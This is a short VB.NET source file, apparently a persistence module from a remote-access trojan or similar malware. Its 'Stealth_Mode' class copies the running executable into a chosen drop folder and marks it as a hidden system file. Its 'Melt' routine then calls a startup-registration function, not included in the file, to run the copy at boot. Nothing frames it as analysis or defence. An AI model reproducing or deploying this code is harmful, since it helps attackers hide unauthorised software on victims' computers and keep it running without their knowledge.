Imports System.IO
Namespace Persistence
    Public Class Stealth_Mode
        Public DropPath As String
        Public InstallName As String
        Public StartName As String
        Public Sub New(ByVal droPath As String, ByVal insName As String, ByVal StartupName As String)
            DropPath = droPath
            InstallName = insName
            StartName = StartupName
        End Sub
        Public Function Install_Server()
            Try
                If Not (Directory.Exists(DropPath)) Then
                    Directory.CreateDirectory(DropPath)
                End If
                If File.Exists(Path.Combine(DropPath, InstallName)) Then
                    File.Delete(Path.Combine(DropPath, InstallName))
                End If
                Melt(Path.Combine(DropPath, InstallName))
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
        Public Function Melt(filename As String)
            Try
                File.Copy(Application.ExecutablePath, filename, True)
                File.SetAttributes(filename, FileAttributes.System + FileAttributes.Hidden)
                AStartup(StartName, filename)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function
    End Class
End Namespace
